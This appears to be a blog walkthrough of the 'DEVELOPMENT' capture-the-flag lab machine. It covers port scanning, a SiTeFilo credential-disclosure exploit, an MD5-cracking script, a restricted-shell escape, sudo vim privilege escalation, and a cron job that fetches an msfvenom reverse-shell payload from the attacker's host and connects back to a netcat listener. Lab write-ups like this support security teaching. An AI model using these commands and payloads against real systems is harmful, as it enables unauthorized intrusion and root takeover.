@@ -1,0 +1,271 @@
+I""K<p>This is a linux machine that requires packet analysis to obtain valuable information, it was also possible identify SiteFilo which reveals the user credentials allowing me access to the system, and abuse sudo permissions to get root.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+<p>Let’s start discovering our target with netdiscover, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/development<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.0/24
+ Currently scanning: Finished!   |   Screen View: Unique Hosts 
+
+ 5 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 282 
+ __________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname  
+ <span class="nt">--------------------------------------------------------------------------</span>
+ 192.168.179.130 00:0c:29:9e:13:ea      4     240  VMware, Inc.        
+ 192.168.179.254 00:50:56:ec:79:b5      1      42  VMware, Inc.       
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+<p>Discovered the target is time to enumerate all TCP open ports, for this I used nmap whith the following instruction:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/development<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-T4</span> <span class="nt">-p-</span> 192.168.179.130 <span class="nt">-oG</span> tcp-scan-all-ports.txt
+...
+PORT     STATE SERVICE
+22/tcp   open  ssh
+113/tcp  open  ident
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+8080/tcp open  http-proxy
+MAC Address: 00:0C:29:9E:13:EA <span class="o">(</span>VMware<span class="o">)</span>
+...
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+<p>With nmap I proceeded to perform an aggressive scan to enumerate services and versions running on open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/development<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-A</span> <span class="nt">-p22</span>,113,139,445,8080 <span class="nt">-Pn</span> 192.168.179.130 <span class="nt">-oN</span> tcp-service-enumeration.txt
+...
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.6p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 79:07:2b:2c:2c:4e:14:0a:e7:b3:63:46:c6:b3:ad:16 <span class="o">(</span>RSA<span class="o">)</span>
+|_  256 24:6b:85:e3:ab:90:5c:ec:d5:83:49:54:cd:98:31:95 <span class="o">(</span>ED25519<span class="o">)</span>
+113/tcp  open  ident?
+|_auth-owners: oident
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+|_auth-owners: root
+445/tcp  open  netbios-ssn Samba smbd 4.7.6-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+|_auth-owners: root
+8080/tcp open  http-proxy  IIS 6.0
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Tue, 29 Jun 2021 20:16:34 GMT
+|     Server: IIS 6.0
+|     Last-Modified: Wed, 26 Dec 2018 01:55:41 GMT
+|     ETag: <span class="s2">"230-57de32091ad69"</span>
+|     Accept-Ranges: bytes
+|     Content-Length: 560
+|     Vary: Accept-Encoding
+|     Connection: close
+|     Content-Type: text/html
+|     &lt;html&gt;
+|     &lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;DEVELOPMENT PORTAL. NOT FOR OUTSIDERS OR HACKERS!&lt;/title&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;p&gt;Welcome to the Development Page.&lt;/p&gt;
+|     &lt;br/&gt;
+|     &lt;p&gt;There are many projects <span class="k">in </span>this box. View some of these projects at html_pages.&lt;/p&gt;
+|     &lt;br/&gt;
+|     &lt;p&gt;WARNING! We are experimenting a host-based intrusion detection system. Report all <span class="nb">false </span>positives to patrick@goodtech.com.sg.&lt;/p&gt;
+|     &lt;br/&gt;
+|     &lt;br/&gt;
+|     &lt;br/&gt;
+|     &lt;hr&gt;
+|     &lt;i&gt;Powered by IIS 6.0&lt;/i&gt;
+|     &lt;/body&gt;
+|     &lt;<span class="o">!</span><span class="nt">--</span> Searching <span class="k">for </span>development secret page... where could it be? <span class="nt">--</span><span class="o">&gt;</span>
+|     &lt;<span class="o">!</span><span class="nt">--</span> Patrick, Head of Development--&gt;
+|     &lt;/html&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Tue, 29 Jun 2021 20:16:35 GMT
+|     Server: IIS 6.0
+|     Allow: GET,POST,OPTIONS,HEAD
+|     Content-Length: 0
+|     Connection: close
+|     Content-Type: text/html
+...
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>We focus on port 8080, browsing the web page we see a message, for view some of the projects visit <strong>html_pages</strong>.</p>
+
+<p><img src="/assets/images/development/screenshot-1.png" alt="" /></p>
+
+<p>We visit that resource and find a list of web file names.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.130:8080/html_pages
+</code></pre></div></div>
+<p><img src="/assets/images/development/screenshot-2.png" alt="" /></p>
+
+<p>Enumerating these web files, in the downloads.html resource, visiting the page source I found the name of a pcap file, as shown in the following screenshots:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.130:8080/downloads.html
+</code></pre></div></div>
+<p><img src="/assets/images/development/screenshot-3.png" alt="" /></p>
+
+<p><img src="/assets/images/development/screenshot-4.png" alt="" /></p>
+
+<p>Then I download the test.pcap file with wget and filter this by http requests with tshark.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/development<span class="nv">$ </span>wget 192.168.179.130:8080/test.pcap
+root@kali:~/development<span class="nv">$ </span>tshark <span class="nt">-r</span> test.pcap <span class="nt">-T</span> fields <span class="nt">-e</span> http.host <span class="nt">-e</span> http.request.uri <span class="nt">-Y</span> <span class="s1">'http.request'</span> 2&gt;/dev/null | <span class="nb">sort</span> <span class="nt">-u</span> | column <span class="nt">-t</span>
+192.168.254.157:8080  /developmentsecretpage/directortestpagev1.php
+192.168.254.160       /qinyi/motivation.html
+</code></pre></div></div>
+<p>I find a request made to port 8080, I access this URL and we are presented an alert box, the same one that redirects us to the director page, then log out this page.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.130:8080/developmentsecretpage/directortestpagev1.php
+</code></pre></div></div>
+<p><img src="/assets/images/development/screenshot-5.png" alt="" /></p>
+
+<p><img src="/assets/images/development/screenshot-6.png" alt="" /></p>
+
+<p>We try to log in to this login page with <strong>admin:admin</strong> or any credential.</p>
+
+<p><img src="/assets/images/development/screenshot-7.png" alt="" /></p>
+
+<p>We see the following error, I googled and find that it is a <strong>Simple Tex-File Login script (SiTeFilo)</strong> and is vulnerable to File Disclosure/Remote File Inclusion, the exploit you can find here <a href="https://www.exploit-db.com/exploits/7444">https://www.exploit-db.com/exploits/7444</a></p>
+
+<p><img src="/assets/images/development/screenshot-8.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="file-disclosure">File Disclosure</h3>
+
+<p>I Download the exploit to the attacking machine and we review its content.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget https://www.exploit-db.com/download/7444
+root@kali:~/development<span class="nv">$ </span>less 7444.txt
+...
+<span class="o">[</span>0x02] Bug:[Remote File Inclusion]
+
+<span class="o">[!]</span> EXPLOIT: /[path]/slogin_lib.inc.php?slogin_path<span class="o">=[</span>remote_txt_shell]
+...
+<span class="o">[</span>0x03] Bug:[Sensitive Data Disclosure]
+...
+In this login system, sensible datas like username and password are stored <span class="k">in </span>a <span class="nb">local
+</span>text file , so we can get sensitive information just going to this txt file <span class="nb">.</span> The name of
+this file is <span class="nb">set </span><span class="k">in </span>slogin_lib.inc.php. By default is: slog_users.txt
+
+<span class="o">[!]</span> EXPLOIT: /[path]/slog_users.txt
+...
+</code></pre></div></div>
+
+<p>I tried exploiting by Remote File Inclusion but for some reason it doesn’t work and I opt for Sensitive Data Disclosure wich allows me to read usernames and passwords in the <strong>slog_users.txt</strong> file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.179.130:8080/developmentsecretpage/slog_users.txt
+</code></pre></div></div>
+<p><img src="/assets/images/development/screenshot-9.png" alt="" /></p>
+
+<p>I downloaded the <strong>slog_users.txt</strong> file and filtered the password hashes to a file called hashes.txt.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/development<span class="nv">$ </span>wget http://192.168.179.130:8080/developmentsecretpage/slog_users.txt
+root@kali:~/development<span class="nv">$ </span><span class="nb">cat </span>slog_users.txt 
+admin, 3cb1d13bb83ffff2defe8d1443d3a0eb
+intern, 4a8a2b374f463b7aedbb44a066363b81
+patrick, 87e6d56ce79af90dbe07d387d3d0579e
+qiu, ee64497098d0926d198f54f6d5431f98
+root@kali:~/development<span class="nv">$ </span><span class="nb">awk</span> <span class="s1">'{print $2}'</span> slog_users.txt <span class="o">&gt;</span> hashes.txt
+</code></pre></div></div>
+
+<p>I developed a python script to crack these md5 hashes.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span><span class="n">re</span>
+
+<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="nb">hash</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">f"https://md5.gromweb.com/?md5=</span><span class="si">{</span><span class="nb">hash</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="n">md5_decrypt</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">"\sstring</span><span class="se">\"</span><span class="s">&gt;(.*?)&lt;/.*"</span><span class="p">,</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">md5_decrypt</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+<span class="n">hashes</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s">"hashes.txt"</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
+    <span class="k">for</span> <span class="nb">hash</span> <span class="ow">in</span> <span class="n">hashes</span><span class="p">:</span>
+        <span class="n">cracked</span><span class="o">=</span><span class="n">decrypt</span><span class="p">(</span><span class="nb">hash</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">cracked</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="nb">hash</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">cracked</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>We execute the script and obtain the passwords.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/development<span class="nv">$ </span>./decrypt.py 
+4a8a2b374f463b7aedbb44a066363b81: 12345678900987654321
+87e6d56ce79af90dbe07d387d3d0579e: P@ssw0rd25
+ee64497098d0926d198f54f6d5431f98: qiu
+</code></pre></div></div>
+<p>We log in to ssh with the username <strong>intern</strong> and password <strong>12345678900987654321</strong> and we have access to a limited shell, to scape this we execute the instruction as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/development<span class="nv">$ </span>ssh intern@192.168.179.130 
+intern@192.168.179.130<span class="s1">'s password: 
+intern:~$ ?
+cd  clear  echo  exit  help  ll  lpath  ls
+intern:~$ echo os.system("/bin/bash")
+intern@development:~$ 
+</span></code></pre></div></div>
+
+<p>I tried to access via ssh with the <strong>patrick</strong> user but he was not allowed, so from the <strong>intern</strong> user I changed to the <strong>patrick</strong> user with the password <strong>P@ssw0rd25</strong>, listing the sudo permissions for this user I found that he was allowed run nano and vim.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>intern@development:~<span class="nv">$ </span>su patrick
+Password: 
+patrick@development:/home/intern<span class="nv">$ </span>
+patrick@development:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>patrick on development:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User patrick may run the following commands on development:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/vim
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /bin/nano
+patrick@development:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo-permissions">Sudo Permissions</h3>
+<p><strong>Privilege scalation with vim</strong></p>
+
+<p>To escalate privileges with vim we will abuse its ability to execute commands, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>patrick@development:~<span class="nv">$ </span><span class="nb">sudo </span>vim <span class="nt">-c</span> <span class="s1">':!/bin/bash'</span>
+
+root@development:~# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+
+<p><strong>Privilege escalation with nano</strong></p>
+
+<p>Another way to escalate privileges is to create a cron job in the <strong>cron.d</strong> directory to download a linux payload, give it execute permissions, and run it, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>patrick@development:~<span class="nv">$ </span><span class="nb">sudo </span>nano /etc/cron.d/evilcron
+</code></pre></div></div>
+<p><img src="/assets/images/development/screenshot-10.png" alt="" /></p>
+
+<p>Then we will create a linux payload with the following instruction:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/development<span class="nv">$ </span>msfvenom <span class="nt">-a</span> x64 <span class="nt">--platform</span> linux <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.179.1 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> elf <span class="nt">-o</span> back.door
+</code></pre></div></div>
+
+<p>We set up a nc listener and after a minute the cron job will download and execute the payload giving us a shell, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/development<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server
+Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+192.168.179.130 - - <span class="o">[</span>23/Apr/2021 17:36:01] <span class="s2">"GET /back.door HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/development<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.130] 36224
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="nb">uname</span> <span class="nt">-a</span>
+Linux development 4.15.0-34-generic <span class="c">#37-Ubuntu SMP Mon Aug 27 15:21:48 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>
+<span class="nb">cat</span> /root/proof.txt
+Congratulations on rooting DEVELOPMENT! :<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Another way to get root on this box is through kernel exploitation which is vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2018-18955">CVE-2018-18955</a>, you can find the exploit <a href="https://www.exploit-db.com/exploits/47165">here</a>, or also through <strong>lxd</strong> since the user patrick is member of the group lxd.</p>
+
+:ET
